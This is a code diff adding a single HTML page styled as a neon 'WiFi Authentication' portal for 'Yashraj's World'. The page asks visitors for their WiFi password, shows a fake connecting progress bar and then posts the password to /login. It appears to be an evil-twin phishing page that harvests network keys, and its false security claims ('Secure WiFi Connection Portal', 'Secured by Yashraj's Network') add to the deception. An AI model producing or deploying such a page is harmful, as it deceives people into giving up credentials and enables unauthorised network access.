@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Yashraj's World - WiFi Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;900&family=Poppins:wght@300;400;500;600;700&display=swap"
+        rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #0a0a1a 0%, #1a1a3a 50%, #0a0a1a 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Animated background particles */
+        .particle {
+            position: absolute;
+            border-radius: 50%;
+            background: rgba(0, 255, 255, 0.3);
+            animation: float 15s infinite;
+            pointer-events: none;
+        }
+
+        @keyframes float {
+
+            0%,
+            100% {
+                transform: translateY(0) rotate(0deg);
+                opacity: 0.3;
+            }
+
+            50% {
+                transform: translateY(-100px) rotate(180deg);
+                opacity: 0.8;
+            }
+        }
+
+        .glass-card {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 24px;
+            box-shadow:
+                0 8px 32px rgba(0, 0, 0, 0.3),
+                inset 0 1px 0 rgba(255, 255, 255, 0.1);
+        }
+
+        .neon-text {
+            font-family: 'Orbitron', sans-serif;
+            text-shadow:
+                0 0 10px rgba(0, 255, 255, 0.8),
+                0 0 20px rgba(0, 255, 255, 0.6),
+                0 0 30px rgba(0, 255, 255, 0.4);
+        }
+
+        .neon-border {
+            border: 2px solid transparent;
+            background: linear-gradient(rgba(255, 255, 255, 0.05), rgba(255, 255, 255, 0.05)) padding-box,
+                linear-gradient(135deg, #00ffff, #a855f7, #84cc16) border-box;
+        }
+
+        .neon-button {
+            background: linear-gradient(135deg, #00ffff, #a855f7);
+            border: none;
+            border-radius: 12px;
+            color: white;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow:
+                0 0 20px rgba(0, 255, 255, 0.4),
+                0 0 40px rgba(168, 85, 247, 0.2);
+        }
+
+        .neon-button:hover {
+            transform: translateY(-2px);
+            box-shadow:
+                0 0 30px rgba(0, 255, 255, 0.6),
+                0 0 60px rgba(168, 85, 247, 0.4);
+        }
+
+        .neon-button:active {
+            transform: translateY(0);
+        }
+
+        .input-field {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            color: white;
+            transition: all 0.3s ease;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #00ffff;
+            box-shadow: 0 0 15px rgba(0, 255, 255, 0.3);
+        }
+
+        .input-field::placeholder {
+            color: rgba(255, 255, 255, 0.4);
+        }
+
+        .cyber-lime {
+            color: #84cc16;
+            text-shadow: 0 0 10px rgba(132, 204, 22, 0.6);
+        }
+
+        .electric-blue {
+            color: #00ffff;
+            text-shadow: 0 0 10px rgba(0, 255, 255, 0.6);
+        }
+
+        .neon-purple {
+            color: #a855f7;
+            text-shadow: 0 0 10px rgba(168, 85, 247, 0.6);
+        }
+
+        .progress-container {
+            display: none;
+        }
+
+        .progress-bar {
+            height: 4px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 2px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #00ffff, #a855f7, #84cc16);
+            width: 0%;
+            transition: width 0.3s ease;
+            box-shadow: 0 0 10px rgba(0, 255, 255, 0.6);
+        }
+
+        @keyframes pulse {
+
+            0%,
+            100% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.5;
+            }
+        }
+
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Animated Background Particles -->
+    <div class="particle" style="width: 100px; height: 100px; top: 10%; left: 10%;"></div>
+    <div class="particle" style="width: 60px; height: 60px; top: 60%; left: 80%; animation-delay: -5s;"></div>
+    <div class="particle" style="width: 80px; height: 80px; top: 80%; left: 20%; animation-delay: -10s;"></div>
+    <div class="particle" style="width: 40px; height: 40px; top: 30%; left: 70%; animation-delay: -7s;"></div>
+    <div class="particle" style="width: 120px; height: 120px; top: 50%; left: 50%; animation-delay: -3s;"></div>
+
+    <div class="w-full max-w-md mx-auto">
+        <!-- Hero Section -->
+        <div class="text-center mb-8">
+            <h1 class="text-4xl md:text-5xl font-bold neon-text electric-blue mb-2">
+                Welcome to
+            </h1>
+            <h2 class="text-3xl md:text-4xl font-bold neon-text neon-purple pulse">
+                Yashraj's World
+            </h2>
+            <p class="text-gray-400 mt-3 text-sm md:text-base">
+                <span class="cyber-lime">●</span> Secure WiFi Connection Portal
+            </p>
+        </div>
+
+        <!-- Glass Login Card -->
+        <div class="glass-card neon-border p-8">
+            <div class="text-center mb-6">
+                <div class="text-5xl mb-3">🌐</div>
+                <h3 class="text-xl font-semibold text-white mb-1">WiFi Authentication</h3>
+                <p class="text-gray-400 text-sm">Enter WiFi Password to Continue</p>
+            </div>
+
+            <form id="loginForm" method="POST" action="/login">
+                <div class="mb-6">
+                    <label for="password" class="block text-sm font-medium text-gray-300 mb-2">
+                        <span class="electric-blue">►</span> WiFi Password
+                    </label>
+                    <input type="password" id="password" name="password" placeholder="Enter your WiFi password"
+                        class="input-field w-full px-4 py-3" required>
+                </div>
+
+                <button type="submit" class="neon-button w-full py-3 text-lg">
+                    <span class="flex items-center justify-center gap-2">
+                        <span>🔗</span>
+                        <span>Connect</span>
+                    </span>
+                </button>
+            </form>
+
+            <!-- Progress Bar -->
+            <div class="progress-container mt-6" id="progress">
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+                <p class="text-center text-gray-400 text-sm mt-2" id="progressText">
+                    Connecting... <span class="electric-blue">0%</span>
+                </p>
+            </div>
+
+            <!-- Footer -->
+            <div class="mt-6 pt-6 border-t border-gray-700/50">
+                <p class="text-center text-gray-500 text-xs">
+                    <span class="cyber-lime">🔒</span> Secured by Yashraj's Network
+                </p>
+                <p class="text-center text-gray-600 text-xs mt-1">
+                    © 2024 All Rights Reserved
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            const password = document.getElementById('password').value;
+
+            if (!password) {
+                alert('Please enter your WiFi password');
+                return;
+            }
+
+            // Show progress
+            const progress = document.getElementById('progress');
+            const progressFill = document.getElementById('progressFill');
+            const progressText = document.getElementById('progressText');
+
+            progress.style.display = 'block';
+
+            let percentage = 0;
+            const interval = setInterval(() => {
+                percentage += 5;
+                progressFill.style.width = percentage + '%';
+                progressText.innerHTML = 'Connecting... <span class="electric-blue">' + percentage + '%</span>';
+
+                if (percentage >= 100) {
+                    clearInterval(interval);
+                    progressText.innerHTML = 'Connected! <span class="cyber-lime">✓</span>';
+
+                    setTimeout(() => {
+                        this.submit();
+                    }, 800);
+                }
+            }, 100);
+        });
+    </script>
+</body>
+
+</html>
